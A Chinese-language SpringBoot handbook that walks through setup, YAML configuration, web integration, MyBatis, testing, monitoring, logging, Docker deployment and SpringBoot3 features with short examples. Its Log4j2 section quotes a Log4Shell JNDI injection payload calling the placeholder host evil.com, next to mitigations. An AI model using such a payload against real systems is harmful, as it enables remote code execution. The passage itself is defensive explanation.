# SpringBoot 核心技术手册

> **阅读指南**：由浅入深，每个知识点均配有精简示例。建议按顺序阅读，环环相扣。

## 📑 目录

### [1. SpringBoot 介绍](#1-springboot-介绍)
- [1.1 Spring 框架的缺点](#11-spring-框架的缺点)
- [1.2 什么是 SpringBoot](#12-什么是-springboot)
- [1.3 SpringBoot3 介绍](#13-springboot3-介绍)

### [2. SpringBoot 入门](#2-springboot-入门)
- [2.1 通过官网搭建项目](#21-通过官网搭建项目)
- [2.2 通过 IDEA 脚手架搭建项目](#22-通过-idea-脚手架搭建项目)
- [2.3 SpringBoot 项目结构](#23-springboot-项目结构)
- [2.4 通过 Maven 搭建项目](#24-通过-maven-搭建项目)
- [2.5 编写 Java 代码](#25-编写-java-代码)

### [3. YAML 配置文件](#3-yaml-配置文件)
- [3.1 配置文件介绍](#31-配置文件介绍)
- [3.2 自定义配置数据](#32-自定义配置数据)
- [3.3 @Value 读取配置文件](#33-value-读取配置文件)
- [3.4 @ConfigurationProperties 读取配置文件](#34-configurationproperties-读取配置文件)
- [3.5 占位符](#35-占位符)
- [3.6 配置文件存放位置及优先级](#36-配置文件存放位置及优先级)
- [3.7 bootstrap 配置文件](#37-bootstrap-配置文件)

### [4. SpringBoot 整合 Web 开发](#4-springboot-整合-web-开发)
- [4.1 Servlet](#41-servlet)
- [4.2 Filter](#42-filter)
- [4.3 Listener](#43-listener)
- [4.4 静态资源](#44-静态资源)
- [4.5 静态资源其他存放位置](#45-静态资源其他存放位置)
- [4.6 JSP](#46-jsp)

### [5. SpringBoot 整合 MyBatis](#5-springboot-整合-mybatis)

### [6. SpringBoot 单元测试](#6-springboot-单元测试)

### [7. SpringBoot 热部署](#7-springboot-热部署)

### [8. SpringBoot 定时任务](#8-springboot-定时任务)

### [9. SpringBoot 内容协商机制](#9-springboot-内容协商机制)
- [9.1 内容协商机制](#91-内容协商机制)
- [9.2 基于请求参数的内容协商机制](#92-基于请求参数的内容协商机制)

### [10. SpringBoot 国际化](#10-springboot-国际化)
- [10.1 SpringBoot 国际化](#101-springboot-国际化)
- [10.2 在 Thymeleaf 中进行国际化](#102-在-thymeleaf-中进行国际化)

### [11. SpringBoot 参数校验](#11-springboot-参数校验)
- [11.1 简单数据类型](#111-简单数据类型)
- [11.2 异常处理](#112-异常处理)
- [11.3 校验相关注解](#113-校验相关注解)
- [11.4 对象类型](#114-对象类型)

### [12. SpringBoot 指标监控](#12-springboot-指标监控)
- [12.1 添加 Actuator 功能](#121-添加-actuator-功能)
- [12.2 Spring Boot Admin](#122-spring-boot-admin)

### [13. SpringBoot 日志管理](#13-springboot-日志管理)
- [13.1 Logback](#131-logback)
- [13.2 打印自定义日志](#132-打印自定义日志)
- [13.3 Log4j2 安全漏洞](#133-log4j2-安全漏洞)

### [14. SpringBoot 项目部署](#14-springboot-项目部署)
- [14.1 项目打包](#141-项目打包)
- [14.2 多环境配置](#142-多环境配置)
- [14.3 Dockerfile 制作镜像](#143-dockerfile-制作镜像)
- [14.4 Maven 插件制作镜像](#144-maven-插件制作镜像)

### [15. SpringBoot 原理分析](#15-springboot-原理分析)
- [15.1 起步依赖](#151-起步依赖)
- [15.2 自动配置](#152-自动配置)
- [15.3 核心注解](#153-核心注解)

### [16. SpringBoot3 新特性](#16-springboot3-新特性)
- [16.1 与之前版本的改动](#161-与之前版本的改动)
- [16.2 ProblemDetails](#162-problemdetails)
- [16.3 Java 语言执行原理](#163-java-语言执行原理)

---

## 1. SpringBoot 介绍

### 1.1 Spring 框架的缺点

Spring 虽然优秀，但在传统使用中存在以下痛点：

| 缺点 | 说明 |
|------|------|
| 配置繁琐 | 早期需大量 XML 配置 Bean，维护成本高 |
| 依赖管理麻烦 | 需手动管理版本号，易出现版本冲突 |
| 部署笨重 | 需独立 Web 容器（Tomcat），部署步骤多 |
| 集成门槛高 | 整合第三方框架需查阅大量文档配置 |

```xml
<!-- 传统 Spring 需大量 XML 配置 -->
<bean id="userDao" class="com.example.dao.impl.UserDaoImpl"/>
<bean id="userService" class="com.example.service.impl.UserServiceImpl">
    <property name="userDao" ref="userDao"/> <!-- 手动注入依赖 -->
</bean>
```

> **核心痛点**：配置重、依赖乱、部署繁，SpringBoot 正是为解决这些问题而生。

### 1.2 什么是 SpringBoot

SpringBoot 是 Spring 团队推出的**约定优于配置**的快速开发框架，核心特性：

- **起步依赖（Starter）**：按功能聚合依赖，自动管理版本
- **自动配置**：根据类路径自动装配 Bean
- **内嵌容器**：内置 Tomcat/Jetty，无需打 WAR 包
- **生产就绪**：提供 Actuator 监控、健康检查等

```java
@SpringBootApplication // 标记启动类，开启自动配置
public class App {
    public static void main(String[] args) {
        SpringApplication.run(App.class, args); // 一行启动 Web 应用
    }
}
```

> **本质**：SpringBoot 不是取代 Spring，而是简化 Spring 应用的初始搭建与开发过程。

### 1.3 SpringBoot3 介绍

SpringBoot3.0 于 2022 年 11 月发布，是里程碑式版本：

| 特性 | 说明 |
|------|------|
| 最低 JDK 17 | 强制要求 Java 17+，支持 LTS 版本 |
| Jakarta EE 9+ | `javax.*` 迁移至 `jakarta.*` 命名空间 |
| GraalVM 原生镜像 | 官方支持 AOT 编译，启动毫秒级 |
| Micrometer Observation | 统一可观测性 API |

```java
// SpringBoot3 中 Servlet API 包名变化
import jakarta.servlet.http.HttpServlet; // 原 javax.servlet.http.HttpServlet
```

> **升级注意**：第三方依赖（如 MyBatis、Swagger）需使用兼容 Jakarta 的版本。

---

## 2. SpringBoot 入门

### 2.1 通过官网搭建项目

使用 [Spring Initializr](https://start.spring.io) 在线生成项目骨架：

1. 选择构建工具（Maven/Gradle）、语言、SpringBoot 版本
2. 填写 Group、Artifact 坐标
3. 添加依赖（Spring Web、Lombok 等）
4. 点击 **GENERATE** 下载 zip，解压后导入 IDE

> **适用场景**：跨 IDE 通用、版本可控、依赖直观。

### 2.2 通过 IDEA 脚手架搭建项目

IDEA 内置 Spring Initializr：

1. `File → New → Project → Spring Initializr`
2. 选择 Server（默认 `start.spring.io`）
3. 配置元信息与依赖
4. 完成后自动生成项目结构

> **优势**：图形化操作，与 IDE 深度集成，适合日常开发。

### 2.3 SpringBoot 项目结构

```
src/main/java
  └── com.example
        └── App.java              // 启动类（建议放根包）
src/main/resources
  ├── application.yml             // 主配置文件
  ├── static/                     // 静态资源（js/css/img）
  ├── templates/                  // 模板页面（Thymeleaf）
  └── mapper/                     // MyBatis 映射文件
src/test/java                     // 测试代码
pom.xml                           // Maven 构建配置
```

> **关键约定**：启动类须位于根包，以便 `@ComponentScan` 扫描所有子包。

### 2.4 通过 Maven 搭建项目

手动创建 Maven 工程并引入 SpringBoot 父工程：

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version> <!-- 父工程统一管理版本 -->
</parent>

<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId> <!-- 起步依赖 -->
    </dependency>
</dependencies>
```

> **要点**：继承 parent 后无需写版本号，依赖冲突由 parent 自动仲裁。

### 2.5 编写 Java 代码

编写第一个 REST 接口：

```java
@RestController // = @Controller + @ResponseBody
@RequestMapping("/api")
public class HelloController {

    @GetMapping("/hello") // GET 请求映射
    public String hello() {
        return "Hello SpringBoot!"; // 直接返回字符串
    }
}
```

启动 `App.main()`，访问 `http://localhost:8080/api/hello` 即可。

> **验证**：默认端口 8080，可通过 `application.yml` 的 `server.port` 修改。

---

## 3. YAML 配置文件

### 3.1 配置文件介绍

SpringBoot 支持两种配置格式：`properties` 与 `yml`。

| 格式 | 特点 |
|------|------|
| `.properties` | 键值对，无层级，冗长 |
| `.yml` | 树形结构，层次清晰，支持复杂数据 |

```yaml
server:
  port: 8080          # YAML 用缩进表示层级
  servlet:
    context-path: /app # 冒号后必须有空格
```

> **注意**：YAML 严格区分缩进，Tab 不允许，只能用空格。

### 3.2 自定义配置数据

可在配置文件中自定义业务属性：

```yaml
user:
  name: 张三
  age: 25
  hobbies:
    - 阅读            # 列表项用 - 表示
    - 编程
```

> **使用方式**：通过 `@Value` 或 `@ConfigurationProperties` 注入到 Bean。

### 3.3 @Value 读取配置文件

使用 `@Value` 注入单个属性：

```java
@Component
public class UserConfig {
    @Value("${user.name}") // 注入 user.name
    private String name;

    @Value("${user.age}")  // 注入 user.age
    private Integer age;
}
```

> **局限**：仅适用于少量、零散的属性注入。

### 3.4 @ConfigurationProperties 读取配置文件

批量绑定配置到 POJO，推荐方式：

```java
@Component
@ConfigurationProperties(prefix = "user") // 绑定 user 前缀
@Data // Lombok 生成 setter/getter
public class UserProps {
    private String name;
    private Integer age;
    private List<String> hobbies; // 自动映射列表
}
```

> **优势**：类型安全、支持松散绑定（`user-name` ↔ `userName`）、校验集成。

### 3.5 占位符

配置中可使用占位符引用其他属性或生成随机值：

```yaml
app:
  name: myapp
  desc: ${app.name} is running on port ${random.int(8000,9000)}
  # ${app.name} 引用属性, ${random.int} 生成随机数
```

> **场景**：端口随机化、动态拼接描述信息、默认值 `${key:default}`。

### 3.6 配置文件存放位置及优先级

SpringBoot 按以下优先级加载 `application.yml`（高 → 低）：

| 优先级 | 位置 |
|--------|------|
| 1 | `config/` 子目录（项目根或 jar 同级） |
| 2 | 项目根目录 / jar 同级 |
| 3 | `classpath:config/` |
| 4 | `classpath:/`（默认 resources 根） |

```yaml
# 外部 config/application.yml 可覆盖 jar 内配置，便于运维不改包
server:
  port: 9090
```

> **运维技巧**：生产环境用外部 `config/` 目录覆盖配置，避免重新打包。

### 3.7 bootstrap 配文件

`bootstrap.yml` 由 SpringCloud 加载，**优先于** `application.yml`：

```yaml
# bootstrap.yml：用于引导阶段（如配置中心连接）
spring:
  cloud:
    nacos:
      config:
        server-addr: 127.0.0.1:8848 # 先从配置中心拉取
        name: user-service
```

| 对比 | bootstrap.yml | application.yml |
|------|---------------|-----------------|
| 加载时机 | 引导阶段 | 应用上下文阶段 |
| 用途 | 配置中心、加密服务 | 业务配置 |
| 优先级 | 高 | 低 |

> **注意**：SpringBoot3 + SpringCloud2022 需手动引入 `spring-cloud-starter-bootstrap`。

---

## 4. SpringBoot 整合 Web 开发

### 4.1 Servlet

通过 `ServletRegistrationBean` 注册原生 Servlet：

```java
@Bean
public ServletRegistrationBean<MyServlet> myServlet() {
    return new ServletRegistrationBean<>(new MyServlet(), "/api/servlet");
    // 注册 MyServlet 到 /api/servlet 路径
}
```

```java
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        resp.getWriter().write("custom servlet"); // 原生 Servlet 输出
    }
}
```

> **场景**：集成遗留 Servlet 组件或特殊协议处理。

### 4.2 Filter

通过 `FilterRegistrationBean` 注册过滤器：

```java
@Bean
public FilterRegistrationBean<MyFilter> myFilter() {
    FilterRegistrationBean<MyFilter> bean = new FilterRegistrationBean<>();
    bean.setFilter(new MyFilter());
    bean.addUrlPatterns("/*");       // 拦截所有请求
    bean.setOrder(1);                // 过滤器顺序
    return bean;
}
```

```java
public class MyFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        System.out.println("前置处理");
        chain.doFilter(req, resp);   // 放行
        System.out.println("后置处理");
    }
}
```

> **用途**：统一鉴权、字符编码、日志记录、跨域处理。

### 4.3 Listener

注册监听器监听容器事件：

```java
@Bean
public ServletListenerRegistrationBean<MyListener> myListener() {
    return new ServletListenerRegistrationBean<>(new MyListener());
}
```

```java
public class MyListener implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        System.out.println("应用启动"); // 容器启动回调
    }
}
```

> **场景**：应用启动时加载缓存、初始化定时任务。

### 4.4 静态资源

SpringBoot 默认静态资源目录（按优先级）：

| 目录 | 访问路径 |
|------|----------|
| `classpath:/META-INF/resources/` | `/` |
| `classpath:/resources/` | `/` |
| `classpath:/static/` | `/` |
| `classpath:/public/` | `/` |

> **访问**：将 `logo.png` 放入 `static/`，访问 `http://localhost:8080/logo.png`。

### 4.5 静态资源其他存放位置

自定义静态资源路径与缓存：

```yaml
spring:
  web:
    resources:
      static-locations: classpath:/static/,file:D:/imgs/
      # 追加本地磁盘目录
  mvc:
    static-path-pattern: /res/** # 访问前缀
```

```java
@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
    registry.addResourceHandler("/img/**")
            .addResourceLocations("file:D:/imgs/"); // 编码方式配置
}
```

> **技巧**：结合 `file:` 前缀可将上传文件目录映射为可访问 URL。

### 4.6 JSP

SpringBoot 默认不支持 JSP（内嵌 Tomcat 限制），需额外配置：

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-jasper</artifactId> <!-- JSP 引擎 -->
</dependency>
```

```yaml
spring:
  mvc:
    view:
      prefix: /WEB-INF/jsp/
      suffix: .jsp
```

> **建议**：SpringBoot 推荐使用 Thymeleaf 替代 JSP，JSP 仅用于兼容旧项目。

---

## 5. SpringBoot 整合 MyBatis

引入 `mybatis-spring-boot-starter` 即可快速整合：

```xml
<dependency>
    <groupId>org.mybatis.spring.boot</groupId>
    <artifactId>mybatis-spring-boot-starter</artifactId>
    <version>3.0.3</version>
</dependency>
```

```yaml
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/test
    username: root
    password: 123456
mybatis:
  mapper-locations: classpath:mapper/*.xml # 映射文件位置
  configuration:
    map-underscore-to-camel-case: true     # 驼峰映射
```

```java
@Mapper // 标记 Mapper 接口
public interface UserMapper {
    @Select("SELECT * FROM user WHERE id=#{id}") // 注解 SQL
    User findById(Long id);
}
```

> **进阶**：复杂 SQL 用 XML 映射；生产建议整合 Druid 连接池与分页插件 PageHelper。

---

## 6. SpringBoot 单元测试

SpringBoot 提供 `@SpringBootTest` 集成测试支持：

```java
@SpringBootTest // 加载完整上下文
class UserServiceTest {

    @Autowired // 注入被测组件
    private UserService userService;

    @Test
    void testFindById() {
        User user = userService.findById(1L);
        assertNotNull(user); // 断言非空
    }
}
```

```java
@WebMvcTest(UserController.class) // 仅加载 Web 层
class UserControllerTest {
    @Autowired
    private MockMvc mockMvc; // 模拟 HTTP 请求

    @Test
    void testHello() throws Exception {
        mockMvc.perform(get("/api/hello"))
               .andExpect(status().isOk()); // 断言状态码 200
    }
}
```

> **分层测试**：`@WebMvcTest` 测 Controller、`@DataJpaTest` 测 DAO、`@SpringBootTest` 测集成。

---

## 7. SpringBoot 热部署

使用 `spring-boot-devtools` 实现热部署：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-devtools</artifactId>
    <scope>runtime</scope> <!-- 运行时生效 -->
    <optional>true</optional>
</dependency>
```

```yaml
spring:
  devtools:
    restart:
      enabled: true           # 开启自动重启
      additional-paths: src/main/java # 监听目录
```

> **原理**：双 ClassLoader 架构，第三方 jar 走基类加载器，业务类走重启加载器，仅重载后者。生产环境禁用。

---

## 8. SpringBoot 定时任务

两步开启定时任务：

```java
@SpringBootApplication
@EnableScheduling // 1. 启动类开启定时任务
public class App { public static void main(String[] args) { SpringApplication.run(App.class, args); } }
```

```java
@Component
public class TaskJob {
    @Scheduled(cron = "0/5 * * * * ?") // 2. 每 5 秒执行
    public void run() { System.out.println("定时任务执行: " + new Date()); }

    @Scheduled(fixedRate = 3000)        // 每 3 秒一次（上次开始算）
    public void fixed() { /* ... */ }
}
```

| 字段 | 含义 | 示例 |
|------|------|------|
| cron | 表达式 | `0 0 2 * * ?` 每天 2 点 |
| fixedRate | 固定频率(ms) | 3000 |
| fixedDelay | 固定延迟(ms) | 5000 |

> **生产建议**：分布式环境用 XXL-JOB 或 Quartz 避免多节点重复执行。

---

## 9. SpringBoot 内容协商机制

### 9.1 内容协商机制

内容协商决定响应数据格式（JSON/XML），基于 `Accept` 请求头：

```java
@GetMapping(value = "/user", produces = {"application/json","application/xml"})
public User user() { return new User(1L, "张三"); }
// produces 限制可产出格式，客户端通过 Accept 头选择
```

```yaml
spring:
  mvc:
    contentnegotiation:
      favor-path-extension: false # 路径扩展名协商已废弃
```

> **默认**：SpringBoot 默认仅启用 Jackson(JSON)，需 XML 则引入 `jackson-dataformat-xml`。

### 9.2 基于请求参数的内容协商机制

通过请求参数 `format` 指定格式：

```yaml
spring:
  mvc:
    contentnegotiation:
      favor-parameter: true   # 启用参数协商
      parameter-name: format  # 参数名
```

```java
// GET /user?format=json → 返回 JSON
// GET /user?format=xml  → 返回 XML
@GetMapping("/user")
public User user() { return new User(1L, "张三"); }
```

> **适用**：不便设置请求头的场景（如浏览器直接访问）。

---

## 10. SpringBoot 国际化

### 10.1 SpringBoot 国际化

通过 `MessageSource` 实现多语言：

```properties
# messages_zh_CN.properties
user.name=张三
# messages_en_US.properties
user.name=John
```

```java
@Component
public class I18nUtil {
    @Autowired
    private MessageSource messageSource;

    public String get(String key, Locale locale) {
        return messageSource.getMessage(key, null, locale); // 按 Locale 取值
    }
}
```

```yaml
spring:
  messages:
    basename: i18n/messages   # 基础名
    encoding: UTF-8
```

> **核心**：通过 `LocaleResolver` 解析语言（按请求头 / Session / Cookie）。

### 10.2 在 Thymeleaf 中进行国际化

Thymeleaf 提供 `#{...}` 语法直接读取国际化消息：

```html
<!-- index.html -->
<h1 th:text="#{user.name}">默认名称</h1>
<!-- 自动按 Locale 渲染对应语言 -->
```

```java
@Bean
public LocaleResolver localeResolver() {
    SessionLocaleResolver r = new SessionLocaleResolver();
    r.setDefaultLocale(Locale.SIMPLIFIED_CHINESE); // 默认中文
    return r;
}
```

> **切换语言**：访问 `?lang=en_US` 触发 `LocaleChangeInterceptor` 切换。

---

## 11. SpringBoot 参数校验

### 11.1 简单数据类型

使用 `@Validated` 校验方法参数：

```java
@RestController
@Validated // 类级别开启校验
public class ParamController {

    @GetMapping("/age")
    public String age(@RequestParam @Min(0) @Max(150) Integer age) {
        return "年龄: " + age; // 校验 age 范围
    }
}
```

> **依赖**：`spring-boot-starter-validation`（SpringBoot2.3+ 需手动引入）。

### 11.2 异常处理

通过全局异常处理器捕获校验异常：

```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public Map<String, String> handle(MethodArgumentNotValidException e) {
        Map<String, String> map = new HashMap<>();
        e.getBindingResult().getFieldErrors().forEach(f ->
            map.put(f.getField(), f.getDefaultMessage())); // 收集字段错误
        return map;
    }
}
```

> **统一规范**：生产环境封装统一响应体（code/message/data）。

### 11.3 校验相关注解

常用校验注解一览：

| 注解 | 作用 | 示例 |
|------|------|------|
| `@NotNull` | 非空 | `@NotNull Integer id` |
| `@NotBlank` | 字符串非空白 | `@NotBlank String name` |
| `@Email` | 邮箱格式 | `@Email String email` |
| `@Size` | 长度范围 | `@Size(min=6,max=20)` |
| `@Pattern` | 正则匹配 | `@Pattern(regexp="^1\\d{10}$")` |
| `@Min/@Max` | 数值范围 | `@Min(0) Integer age` |

### 11.4 对象类型

对 POJO 进行级联校验：

```java
@Data
public class UserDTO {
    @NotBlank(message = "姓名不能为空")
    private String name;

    @Email(message = "邮箱格式错误")
    private String email;

    @Valid // 级联校验嵌套对象
    private AddressDTO address;
}
```

```java
@PostMapping("/user")
public String add(@Valid @RequestBody UserDTO dto) {
    return "OK"; // @Valid 触发校验
}
```

> **进阶**：自定义校验注解实现 `ConstraintValidator`，支持业务规则（如手机号查重）。

---

## 12. SpringBoot 指标监控

### 12.1 添加 Actuator 功能

Actuator 提供生产级监控端点：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
```

```yaml
management:
  endpoints:
    web:
      exposure:
        include: '*'         # 暴露所有端点（生产按需开放）
  endpoint:
    health:
      show-details: always   # 显示健康详情
```

> **常用端点**：`/actuator/health`（健康）、`/actuator/metrics`（指标）、`/actuator/env`（环境）。

### 12.2 Spring Boot Admin

Spring Boot Admin 提供可视化监控界面，分 Server 与 Client：

```java
// Server 端
@SpringBootApplication
@EnableAdminServer // 开启 Admin 服务
public class AdminApp { public static void main(String[] args) { SpringApplication.run(AdminApp.class, args); } }
```

```yaml
# Client 端注册到 Server
spring:
  boot:
    admin:
      client:
        url: http://localhost:9090 # Admin Server 地址
```

> **功能**：应用列表、健康状态、日志级别动态调整、JVM 指标图表。

---

## 13. SpringBoot 日志管理

### 13.1 Logback

SpringBoot 默认使用 Logback，配置文件 `logback-spring.xml`：

```yaml
logging:
  level:
    com.example: DEBUG           # 包级别日志级别
    root: INFO
  file:
    name: logs/app.log           # 输出文件
```

```xml
<!-- logback-spring.xml 滚动策略 -->
<rollingPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy">
    <fileNamePattern>logs/app-%d{yyyy-MM-dd}.%i.log</fileNamePattern>
    <maxFileSize>10MB</maxFileSize> <!-- 单文件大小 -->
    <maxHistory>30</maxHistory>      <!-- 保留天数 -->
</rollingPolicy>
```

> **优势**：`logback-spring.xml` 可使用 SpringProfile 区分环境。

### 13.2 打印自定义日志

使用 `@Slf4j`（Lombok）简化日志输出：

```java
@Slf4j // Lombok 自动生成 log 字段
@Service
public class OrderService {
    public void create(Long id) {
        log.info("创建订单: id={}", id);    // 使用占位符
        log.debug("调试信息: {}", id);
        log.error("异常发生", new RuntimeException("err"));
    }
}
```

> **规范**：参数用 `{}` 占位符，避免字符串拼接开销；异常单独传入。

### 13.3 Log4j2 安全漏洞

2021 年 Log4j2 爆发 CVE-2021-44228（Log4Shell）远程代码执行漏洞：

```yaml
# 漏洞原理：JNDI 注入
# 攻击载荷：${jndi:ldap://evil.com/x}
log4j2:
  formatMsgNoLookups: true # 临时缓解措施
```

```xml
<!-- 升级到安全版本 -->
<log4j2.version>2.17.1</log4j2.version> <!-- properties 中强制版本 -->
```

> **防范**：① 升级 ≥2.17.0；② 禁用 JNDI 查找；③ WAF 拦截 `${jndi:}` 载荷；④ 监控日志输入。

---

## 14. SpringBoot 项目部署

### 14.1 项目打包

SpringBoot 默认打为可执行 jar：

```xml
<build>
    <finalName>app</finalName>
    <plugins>
        <plugin>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-maven-plugin</artifactId>
            <!-- 打可执行 fat jar -->
        </plugin>
    </plugins>
</build>
```

```bash
mvn clean package         # 生成 target/app.jar
java -jar target/app.jar  # 直接运行
```

> **原理**：fat jar 内嵌依赖 jar，通过 `JarLauncher` 启动，独立运行无需外部容器。

### 14.2 多环境配置

使用 Profile 区分环境：

```yaml
# application.yml
spring:
  profiles:
    active: dev # 激活 dev 环境

---
spring:
  config:
    activate:
      on-profile: dev # 开发环境
server:
  port: 8080

---
spring:
  config:
    activate:
      on-profile: prod # 生产环境
server:
  port: 80
```

```bash
java -jar app.jar --spring.profiles.active=prod # 命令行切换环境
```

> **实践**：`application-dev.yml`、`application-prod.yml` 分文件管理更清晰。

### 14.3 Dockerfile 制作镜像

手工编写 Dockerfile：

```dockerfile
FROM openjdk:17-slim
WORKDIR /app
COPY target/app.jar app.jar   # 拷贝 jar
EXPOSE 8080
ENTRYPOINT ["java","-jar","app.jar"] # 启动命令
```

```bash
docker build -t myapp:1.0 .   # 构建镜像
docker run -d -p 8080:8080 myapp:1.0 # 运行容器
```

> **优化**：多阶段构建减小镜像体积；用 `jib` 或 `spring-boot:build-image` 无 Dockerfile 构建。

### 14.4 Maven 插件制作镜像

使用 `spring-boot-maven-plugin` 的 `build-image` 目标：

```xml
<plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
    <configuration>
        <image>
            <name>myapp:${project.version}</name> <!-- 镜像名 -->
        </image>
    </configuration>
</plugin>
```

```bash
mvn spring-boot:build-image # 基于 Cloud Native Buildpacks 构建分层镜像
```

> **优势**：无需 Dockerfile，自动分层优化缓存，支持 GraalVM 原生镜像。

---

## 15. SpringBoot 原理分析

### 15.1 起步依赖

Starter 是一组依赖聚合，按功能打包：

| Starter | 包含能力 |
|---------|----------|
| `spring-boot-starter-web` | SpringMVC + Tomcat + Jackson |
| `spring-boot-starter-data-jpa` | JPA + Hibernate |
| `spring-boot-starter-test` | JUnit + Mockito + AssertJ |

```xml
<!-- 一个 starter 顶一堆依赖，版本由 parent 统一管理 -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

> **本质**：Starter 是空 jar（仅 pom），传递依赖实际功能包；`spring-boot-starter-parent` 通过 `dependencyManagement` 锁定版本。

### 15.2 自动配置

自动配置是 SpringBoot 核心，通过条件注解按需装配 Bean：

```java
@AutoConfiguration // SpringBoot3 自动配置类
@ConditionalOnClass(DataSource.class) // 类路径存在才生效
@ConditionalOnProperty(prefix = "app.db", name = "enabled", havingValue = "true")
@EnableConfigurationProperties(DbProps.class) // 启用配置绑定
public class DbAutoConfiguration {
    @Bean
    @ConditionalOnMissingBean // 容器无该 Bean 时才创建
    public DataSource dataSource(DbProps props) {
        return props.build(); // 自动装配数据源
    }
}
```

| 条件注解 | 触发条件 |
|----------|----------|
| `@ConditionalOnClass` | 类路径存在指定类 |
| `@ConditionalOnMissingBean` | 容器中无指定 Bean |
| `@ConditionalOnProperty` | 配置满足条件 |
| `@ConditionalOnWebApplication` | 是 Web 应用 |

> **加载机制**：`spring.factories`（2.x）或 `AutoConfiguration.imports`（3.x）注册自动配置类，启动时通过 SPI 加载。

### 15.3 核心注解

`@SpringBootApplication` 是组合注解：

```java
@SpringBootApplication // 等价于以下三个注解组合
// @SpringBootConfiguration  → 标记配置类（含 @Configuration）
// @EnableAutoConfiguration  → 开启自动配置（加载 AutoConfiguration.imports）
// @ComponentScan            → 扫描启动类所在包及子包
public class App { }
```

```java
// 排除特定自动配置
@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})
public class App { } // 排除数据源自动配置
```

> **关键**：启动类位置决定扫描范围；排除无用的自动配置可加速启动、减小体积。

---

## 16. SpringBoot3 新特性

### 16.1 与之前版本的改动

SpringBoot3 主要变化：

| 改动项 | 2.x | 3.x |
|--------|-----|-----|
| JDK 基线 | 8/11 | **17+** |
| 命名空间 | `javax.*` | `jakarta.*` |
| 原生镜像 | 实验性 | 官方支持（GraalVM） |
| 可观测性 | Spring Cloud Sleuth | Micrometer Observation |
| 配置文件 | `spring.factories` | `AutoConfiguration.imports` |

```java
// 包名迁移示例
import jakarta.persistence.Entity;   // 原 javax.persistence.Entity
import jakarta.validation.constraints.NotBlank;
```

> **迁移建议**：用 `spring-boot-migrator` 工具辅助升级；第三方依赖需 Jakarta 兼容版本。

### 16.2 ProblemDetails

SpringBoot3 默认启用 RFC 7807 `ProblemDetails` 标准错误响应：

```java
@ExceptionHandler(UserNotFound.class)
public ProblemDetail handleNotFound(UserNotFound e) {
    ProblemDetail pd = ProblemDetail.forStatus(404);
    pd.setTitle("用户不存在");          // 标准字段
    pd.setDetail(e.getMessage());
    pd.setProperty("timestamp", Instant.now()); // 扩展字段
    return pd;
}
```

```json
// 标准化错误响应结构
{
  "type": "about:blank",
  "title": "用户不存在",
  "status": 404,
  "detail": "id=99 不存在",
  "timestamp": "2026-08-02T10:00:00Z"
}
```

> **优势**：统一错误格式，跨语言可解析，符合 RESTful 规范。

### 16.3 Java 语言执行原理

SpringBoot3 支持两种运行模式：JVM 与 GraalVM 原生镜像。

```xml
<plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
    <configuration>
        <image>
            <builder>paketobuildpacks/builder-jammy-tiny</builder>
            <env>
                <BP_NATIVE_IMAGE>true</BP_NATIVE_IMAGE> <!-- 启用原生镜像 -->
            </env>
        </image>
    </configuration>
</plugin>
```

| 模式 | 启动时间 | 内存占用 | 峰值性能 | 限制 |
|------|----------|----------|----------|------|
| JVM | 秒级 | 较高 | 高（JIT） | 反射灵活 |
| Native Image | **毫秒级** | **极低** | 启动即峰值 | 需 AOT 配置，反射受限 |

```java
// 原生镜像需声明反射配置
@RegisterReflectionForBinding(User.class) // 注册反射类
public class AppConfig { }
```

> **原理**：GraalVM 在构建期进行 AOT（Ahead-Of-Time）编译，通过封闭世界分析将字节码编译为机器码，运行时无需 JVM；SpringBoot3 通过 AOT 处理器生成反射、代理的元数据配置以兼容原生镜像。

---

## 📚 学习路线总结

```
入门 → 配置 → Web → 持久层 → 测试 → 进阶特性 → 监控运维 → 原理 → 新版本
 1-2    3     4      5        6-8     9-11         12-13     14-15    16
```

> **建议**：先掌握 1-8 章快速上手项目，再深入 9-13 章工程化能力，最后通过 14-16 章理解原理与新版本，形成完整知识闭环。
